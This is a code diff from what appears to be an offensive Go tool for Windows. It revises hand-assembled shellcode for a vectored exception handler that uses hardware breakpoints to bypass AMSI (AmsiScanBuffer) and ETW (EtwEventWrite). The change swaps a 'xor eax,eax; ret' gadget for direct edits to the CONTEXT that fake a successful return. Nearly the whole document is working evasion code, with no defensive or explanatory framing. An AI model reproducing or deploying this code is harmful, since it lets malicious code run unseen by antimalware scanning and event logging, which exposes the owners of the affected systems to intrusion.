@@ -128,21 +128,19 @@ var (
 // The handler is allocated via VirtualAlloc with PAGE_EXECUTE_READWRITE.
 // A separate data block (RW) stores the AMSI and ETW target addresses.
 //
-// Data block layout (24 bytes):
+// Data block layout (16 bytes):
 //
 //	[0x00] uint64: AmsiScanBuffer address (0 = not set)
 //	[0x08] uint64: EtwEventWrite address  (0 = not set)
-//	[0x10] uint64: Gadget address ("xor eax,eax; ret" for AMSI bypass)
 //
 // Handler logic (x64 Windows ABI, RCX = EXCEPTION_POINTERS*):
 //  1. Check ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP (0x80000004)
 //  2. Load ContextRecord pointer
 //  3. Compare ContextRecord->Rip against AMSI addr:
-//     - Write AMSI_RESULT_CLEAN (0) to output param at [Rsp+0x30] (dereferenced)
-//     - Redirect Rip to "xor eax,eax; ret" gadget (returns S_OK)
+//     - Simulate RET: Rip=[Rsp], Rsp+=8, Rax=0 (S_OK)
 //     - One-shot: disable Dr0 (clear Dr7 bit 0)
 //  4. Compare ContextRecord->Rip against ETW addr:
-//     - Redirect Rip to same gadget (returns 0/STATUS_SUCCESS)
+//     - Simulate RET: Rip=[Rsp], Rsp+=8, Rax=0 (STATUS_SUCCESS)
 //     - One-shot: disable Dr1 (clear Dr7 bit 2)
 //  5. Clear Dr6, return EXCEPTION_CONTINUE_EXECUTION (-1)
 //  6. If no match → return EXCEPTION_CONTINUE_SEARCH (0)
@@ -151,10 +149,10 @@ var (
 // to prevent repeated VEH handler invocations from Go runtime threads calling
 // EtwEventWrite during GC/scheduling, which causes process crashes.
 func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, dataAddr uintptr, err error) {
-	// Allocate 24-byte data block (RW) for target addresses and gadget pointer
+	// Allocate 16-byte data block (RW) for target addresses
 	dataPtr, _, callErr := procVirtualAlloc.Call(
 		0,
-		24,
+		16,
 		uintptr(MEM_COMMIT|MEM_RESERVE),
 		uintptr(PAGE_READWRITE),
 	)
@@ -163,8 +161,8 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	}
 
 	// Write target addresses into data block
-	// [0x00] = AmsiScanBuffer addr, [0x08] = EtwEventWrite addr, [0x10] = gadget addr (filled later)
-	dataSlice := (*[24]byte)(unsafe.Pointer(dataPtr))
+	// [0x00] = AmsiScanBuffer addr, [0x08] = EtwEventWrite addr
+	dataSlice := (*[16]byte)(unsafe.Pointer(dataPtr))
 	binary.LittleEndian.PutUint64(dataSlice[0:8], uint64(amsiAddr))
 	binary.LittleEndian.PutUint64(dataSlice[8:16], uint64(etwAddr))
 
@@ -234,19 +232,32 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	jneSkipAmsiOffset := len(code)
 	code = append(code, 0x00) // placeholder
 
-	// AMSI match: redirect execution to an embedded "xor eax,eax; ret" gadget.
-	// The gadget executes naturally via the CPU's RET instruction, returning
-	// S_OK (0) to AmsiScanBuffer's caller with correct stack unwinding.
+	// AMSI match: simulate an immediate RET from AmsiScanBuffer returning
+	// S_OK (0). We modify the CONTEXT directly:
+	//   - context.Rip = [context.Rsp]     (pop return address)
+	//   - context.Rsp = context.Rsp + 8   (adjust stack)
+	//   - context.Rax = 0                 (S_OK return value)
 	//
 	// Both AMSI and ETW are one-shot (disable after first interception per
-	// thread) to prevent repeated VEH invocations from Go runtime threads
-	// that cause process crashes.
+	// thread) to prevent repeated VEH invocations from Go runtime threads.
 
-	// Load gadget address from data block: rax = [r13+0x10]
-	code = append(code, 0x49, 0x8B, 0x45, 0x10)       // mov rax, [r13+0x10]
-	// Set context.Rip to gadget address: [rbx+0xF8] = rax
-	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+disp32], rax
-	code = append(code, 0xF8, 0x00, 0x00, 0x00)       // disp32 = 0xF8 (Rip)
+	// Load context.Rsp: rax = [rbx+0x98]
+	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x98]
+	code = append(code, 0x98, 0x00, 0x00, 0x00)       // disp32 = 0x98 (Rsp)
+	// Load return address: rcx = [rax] (return addr at top of stack)
+	// (we can clobber rcx since we're overwriting the context, not returning to caller)
+	code = append(code, 0x48, 0x8B, 0x08)             // mov rcx, [rax]
+	// Set context.Rip = return address: [rbx+0xF8] = rcx
+	code = append(code, 0x48, 0x89, 0x8B)             // mov [rbx+0xF8], rcx
+	code = append(code, 0xF8, 0x00, 0x00, 0x00)
+	// Adjust context.Rsp += 8: rax += 8, then store back
+	code = append(code, 0x48, 0x83, 0xC0, 0x08)       // add rax, 8
+	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+0x98], rax
+	code = append(code, 0x98, 0x00, 0x00, 0x00)
+	// Set context.Rax = 0 (S_OK): [rbx+0x78] = 0
+	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+0x78], 0
+	code = append(code, 0x78, 0x00, 0x00, 0x00)
+	code = append(code, 0x00, 0x00, 0x00, 0x00)
 	// One-shot: disable Dr0 (AMSI breakpoint) by clearing bit 0 of Dr7
 	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x70]
 	code = append(code, 0x70, 0x00, 0x00, 0x00)       // Dr7 offset
@@ -285,14 +296,26 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	jneNotOursShortOffset := len(code)
 	code = append(code, 0x00) // placeholder
 
-	// ETW match: redirect execution to the same "xor eax,eax; ret" gadget.
-	// EtwEventWrite returns ULONG (0 = success).
-	// Load gadget address from data block: rax = [r13+0x10]
-	code = append(code, 0x49, 0x8B, 0x45, 0x10)       // mov rax, [r13+0x10]
-	// Set context.Rip to gadget address: [rbx+0xF8] = rax
-	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+disp32], rax
-	code = append(code, 0xF8, 0x00, 0x00, 0x00)       // disp32 = 0xF8 (Rip)
-	// Disable Dr1 (ETW breakpoint) by clearing bit 2 of Dr7 in context
+	// ETW match: simulate immediate RET from EtwEventWrite returning 0 (success).
+	// Same direct CONTEXT modification as AMSI: pop return addr, adjust RSP, set RAX=0.
+
+	// Load context.Rsp: rax = [rbx+0x98]
+	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x98]
+	code = append(code, 0x98, 0x00, 0x00, 0x00)       // disp32 = 0x98 (Rsp)
+	// Load return address: rcx = [rax]
+	code = append(code, 0x48, 0x8B, 0x08)             // mov rcx, [rax]
+	// Set context.Rip = return address: [rbx+0xF8] = rcx
+	code = append(code, 0x48, 0x89, 0x8B)             // mov [rbx+0xF8], rcx
+	code = append(code, 0xF8, 0x00, 0x00, 0x00)
+	// Adjust context.Rsp += 8
+	code = append(code, 0x48, 0x83, 0xC0, 0x08)       // add rax, 8
+	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+0x98], rax
+	code = append(code, 0x98, 0x00, 0x00, 0x00)
+	// Set context.Rax = 0: [rbx+0x78] = 0
+	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+0x78], 0
+	code = append(code, 0x78, 0x00, 0x00, 0x00)
+	code = append(code, 0x00, 0x00, 0x00, 0x00)
+	// One-shot: disable Dr1 (ETW breakpoint) by clearing bit 2 of Dr7
 	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x70]
 	code = append(code, 0x70, 0x00, 0x00, 0x00)       // Dr7 offset
 	code = append(code, 0x48, 0x83, 0xE0, 0xFB)       // and rax, ~4 (clear bit 2)
@@ -331,14 +354,7 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	code = append(code, 0x5D)                         // pop rbp
 	code = append(code, 0xC3)                         // ret
 
-	// Append the "xor eax, eax; ret" gadget for AMSI bypass.
-	// When the AMSI breakpoint fires, the VEH handler redirects Rip here.
-	// This gadget executes as if AmsiScanBuffer returned S_OK (0).
-	gadgetOffset := len(code)
-	code = append(code, 0x31, 0xC0)                   // xor eax, eax
-	code = append(code, 0xC3)                         // ret
-
-	// Allocate executable memory and copy shellcode + gadget
+	// Allocate executable memory and copy shellcode
 	codeSize := uintptr(len(code))
 	codePtr, _, callErr := procVirtualAlloc.Call(
 		0,
@@ -353,10 +369,6 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	// Copy shellcode to executable memory
 	codeSlice := unsafe.Slice((*byte)(unsafe.Pointer(codePtr)), len(code))
 	copy(codeSlice, code)
-
-	// Store gadget address in data block at offset 0x10
-	gadgetAddr := codePtr + uintptr(gadgetOffset)
-	binary.LittleEndian.PutUint64(dataSlice[16:24], uint64(gadgetAddr))
 
 	return codePtr, dataPtr, nil
 }
@@ -452,8 +464,8 @@ func SetupHardwareBreakpoints(amsiAddr, etwAddr uintptr) (string, error) {
 		hwbpInstalled = true
 		output += "[+] Native VEH handler registered (Go-runtime-independent)\n"
 	} else {
-		// Update target addresses in existing data block (gadget addr at 0x10 unchanged)
-		dataSlice := (*[24]byte)(unsafe.Pointer(hwbpDataBlock))
+		// Update target addresses in existing data block
+		dataSlice := (*[16]byte)(unsafe.Pointer(hwbpDataBlock))
 		binary.LittleEndian.PutUint64(dataSlice[0:8], uint64(amsiAddr))
 		binary.LittleEndian.PutUint64(dataSlice[8:16], uint64(etwAddr))
 		output += "[*] VEH already registered, updating breakpoint addresses\n"
